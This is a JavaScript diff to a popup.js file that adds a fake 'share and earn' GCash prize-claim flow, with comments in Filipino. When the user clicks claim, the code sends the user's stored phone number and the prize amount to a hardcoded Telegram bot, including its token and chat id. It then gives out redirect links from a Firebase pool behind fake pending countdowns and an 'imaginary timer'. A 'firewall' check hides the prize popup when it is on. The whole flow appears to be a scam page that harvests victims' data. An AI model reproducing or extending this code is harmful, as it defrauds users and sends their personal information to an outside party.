@@ -387,6 +387,136 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log("Popup.js loaded");
 });
 
+
+// ========== ADAPTED FUNCTIONS FOR SHARE_AND_EARN (NO BALANCE DISPLAY) ==========
+// Idagdag ito sa dulo ng popup.js file, bago ang DOMContentLoaded event
+
+// Override startSmoothDecrement para sa share_and_earn (walang balance display)
+const originalStartSmoothDecrement = startSmoothDecrement;
+window.startSmoothDecrement = function(originalAmount) {
+    const balanceText = document.getElementById('balanceText');
+    if (!balanceText) {
+        console.log("No balance display - skipping decrement animation");
+        return;
+    }
+    originalStartSmoothDecrement(originalAmount);
+};
+
+// Override startVisibleCountdown para sa share_and_earn
+const originalStartVisibleCountdown = startVisibleCountdown;
+window.startVisibleCountdown = function(originalAmount) {
+    const timerSpan = document.getElementById('pendingCountdown');
+    if (!timerSpan) {
+        console.log("No countdown display - skipping");
+        return;
+    }
+    originalStartVisibleCountdown(originalAmount);
+};
+
+// Ensure showClaimPopup works even without balanceText
+const originalShowClaimPopup = showClaimPopup;
+window.showClaimPopup = async function(amount) {
+    console.log("showClaimPopup called with amount:", amount);
+    
+    const firewallActive = await getFirewallStatus();
+    console.log("Firewall active:", firewallActive);
+    
+    if (firewallActive) {
+        console.log("FIREWALL ON - Showing verification popup");
+        showFirewallPopup();
+        return;
+    }
+    
+    console.log("FIREWALL OFF - Showing congratulations popup");
+    claimState.currentAmount = amount;
+    claimState.isProcessing = false;
+    claimState.hasRedirected = false;
+    
+    const popup = document.getElementById('claimPopup');
+    const prizeSpan = document.getElementById('popupPrizeAmount');
+    const claimBtn = document.getElementById('claimActionBtn');
+    
+    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
+    if (claimBtn) {
+        claimBtn.innerHTML = 'CLAIM THRU GCASH';
+        claimBtn.disabled = false;
+    }
+    if (popup) popup.style.display = 'flex';
+};
+
+// Ensure onClaimAction works for share_and_earn
+const originalOnClaimAction = onClaimAction;
+window.onClaimAction = function() {
+    if (claimState.isProcessing) return;
+    
+    claimState.isProcessing = true;
+    const claimBtn = document.getElementById('claimActionBtn');
+    const amount = claimState.currentAmount;
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    
+    if (claimBtn) {
+        claimBtn.disabled = true;
+        claimBtn.innerHTML = 'PROCESSING...';
+    }
+    
+    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
+        .catch(e => console.log('Telegram error:', e));
+    
+    if (typeof firebase !== 'undefined' && firebase.database) {
+        const db = firebase.database();
+        
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
+            if (snapshot.exists()) {
+                const key = Object.keys(snapshot.val())[0];
+                const linkData = snapshot.val()[key];
+                const redirectUrl = linkData.url;
+                
+                db.ref('links/' + key).update({ 
+                    status: 'claimed', 
+                    user: userPhone, 
+                    amount: amount, 
+                    claimedAt: Date.now() 
+                });
+                
+                hideClaimPopup();
+                showPendingStatus();
+                
+                // Check if balanceText exists before decrement
+                const balanceText = document.getElementById('balanceText');
+                if (balanceText) {
+                    startSmoothDecrement(amount);
+                } else {
+                    console.log("No balance display - skipping decrement");
+                }
+                
+                startVisibleCountdown(amount);
+                startImaginaryTimer(redirectUrl);
+                
+            } else {
+                if (claimBtn) {
+                    claimBtn.innerHTML = 'NO REWARDS';
+                    setTimeout(() => {
+                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                        claimBtn.disabled = false;
+                        claimState.isProcessing = false;
+                    }, 3000);
+                }
+                alert("Your Withdrawal is unsuccessful. Switch another device and claim your rewards!.");
+            }
+        }).catch((err) => {
+            console.error("Firebase error:", err);
+            if (claimBtn) {
+                claimBtn.innerHTML = 'ERROR';
+                setTimeout(() => {
+                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                    claimBtn.disabled = false;
+                    claimState.isProcessing = false;
+                }, 3000);
+            }
+        });
+    }
+};
+
 // Expose functions for global access
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
